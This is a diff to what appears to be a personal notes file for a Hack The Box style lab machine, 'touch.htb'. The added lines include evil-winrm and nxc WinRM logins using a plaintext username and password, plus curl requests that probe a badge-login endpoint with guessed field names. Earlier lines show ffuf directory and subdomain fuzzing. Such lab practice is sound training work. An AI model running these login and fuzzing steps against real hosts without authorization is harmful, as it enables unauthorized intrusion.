@@ -28,3 +28,24 @@ ffuf -w /usr/share/wordlists/dirb/common.txt -u touch.htb:8443/FUZZ -fc 404 -ac
 ffuf -u http://touch.htb:8443/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.touch.htb:5589" -fs 154 -fc 301,302 -ac
 
 10.129.78.162
+
+evil-winrm -i touch.htb -u 'jenny' -p 'Fl1ghtDeck2026!'
+
+nxc winrm touch.htb -u 'jenny' -p 'Fl1ghtDeck2026!'
+
+# Test various key names
+curl -X POST http://touch.htb:8443/login/badge \
+  -H "Content-Type: application/json" \
+  -d '{"badge_id":"KS7X2M"}' -k
+
+curl -X POST http://touch.htb:8443/login/badge \
+  -H "Content-Type: application/json" \
+  -d '{"id":"KS7X2M"}' -k
+
+curl -X POST http://touch.htb:8443/login/badge \
+  -H "Content-Type: application/json" \
+  -d '{"user":"jenny"}' -k
+
+curl -X POST http://touch.htb:8443/login/badge \
+  -H "Content-Type: application/json" \
+  -d '{"badge":"KS7X2M"}' -k
